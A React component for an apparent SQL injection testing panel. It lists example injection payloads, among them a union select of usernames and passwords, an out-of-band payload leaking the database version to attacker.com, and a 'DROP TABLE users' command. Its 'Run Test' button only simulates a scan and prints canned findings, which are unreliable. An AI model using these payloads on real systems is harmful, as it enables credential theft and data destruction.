
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';

const SQLInjectionPanel: React.FC = () => {
  const [target, setTarget] = useState('');
  const [queryType, setQueryType] = useState('Union Based');
  const [isRunning, setIsRunning] = useState(false);
  const [results, setResults] = useState('');
  const { toast } = useToast();

  const queryTypes = [
    'Union Based',
    'Error Based',
    'Blind Boolean',
    'Time Based',
    'Out-of-band',
    'Batch Execution'
  ];

  const payloadExamples = {
    'Union Based': "' UNION SELECT username, password FROM users--",
    'Error Based': "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)--",
    'Blind Boolean': "' OR 1=1--",
    'Time Based': "' OR IF(1=1, SLEEP(5), 0)--",
    'Out-of-band': "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.attacker.com\\\\share')),2--",
    'Batch Execution': "'; DROP TABLE users--"
  };

  const handleRunAttack = () => {
    if (!target) {
      toast({
        title: "Error",
        description: "Please enter a target URL",
        variant: "destructive"
      });
      return;
    }

    setIsRunning(true);
    setResults('');
    toast({
      title: "Test Started",
      description: `Running ${queryType} SQL injection test on ${target}`,
    });

    // Simulate getting results
    setTimeout(() => {
      setIsRunning(false);
      setResults(`
Test: ${queryType} SQL Injection
Target: ${target}
Timestamp: ${new Date().toISOString()}

Testing with payload: ${payloadExamples[queryType as keyof typeof payloadExamples]}

[+] Potential vulnerability found!
[+] Server responded with database error
[+] DBMS: MySQL 5.7.38
[+] Retrieved data: 
    - Database: example_db
    - Tables found: users, products, orders
    - Columns in users: id, username, password, email

[!] Recommendation: Implement prepared statements and input validation
`);
      toast({
        title: "Test Complete",
        description: `SQL injection test finished. Found potential vulnerabilities.`,
      });
    }, 3000);
  };

  return (
    <div className="flex flex-col h-full p-4 text-white bg-[#252526] overflow-auto">
      <h2 className="text-xl font-semibold mb-4">SQL Injection Testing</h2>
      <p className="mb-4 text-sm text-gray-400">
        This module helps identify and test for SQL injection vulnerabilities. For educational and authorized testing only.
      </p>
      
      <div className="space-y-4 mb-6">
        <div>
          <label className="block text-sm mb-1">Target URL</label>
          <Input
            value={target}
            onChange={(e) => setTarget(e.target.value)}
            placeholder="https://example.com/login.php"
            className="bg-[#1e1e1e] border-[#333] w-full"
          />
        </div>
        
        <div>
          <label className="block text-sm mb-1">Injection Type</label>
          <select
            value={queryType}
            onChange={(e) => setQueryType(e.target.value)}
            className="w-full rounded bg-[#1e1e1e] border border-[#333] p-2"
          >
            {queryTypes.map((type) => (
              <option key={type} value={type}>{type}</option>
            ))}
          </select>
        </div>
        
        <div>
          <label className="block text-sm mb-1">Example Payload</label>
          <Textarea
            readOnly
            value={payloadExamples[queryType as keyof typeof payloadExamples] || ''}
            className="h-16 bg-[#1a1a1a] border-[#333] font-mono text-sm p-2 w-full"
          />
        </div>
      </div>
      
      <div className="flex space-x-2 mb-4">
        <Button
          onClick={handleRunAttack}
          disabled={isRunning}
          className={`flex-1 ${isRunning ? 'bg-yellow-600' : 'bg-blue-600'} hover:bg-blue-700`}
        >
          {isRunning ? 'Running Test...' : 'Run Test'}
        </Button>
        
        <Button
          onClick={() => setResults('')}
          variant="outline"
          className="border-[#333] text-gray-300"
        >
          Clear Results
        </Button>
      </div>
      
      <div className="flex-1">
        <label className="block text-sm mb-1">Results</label>
        <Textarea
          readOnly
          value={results}
          className="h-64 bg-[#1a1a1a] border-[#333] font-mono text-sm p-2 w-full"
        />
      </div>
    </div>
  );
};

export default SQLInjectionPanel;
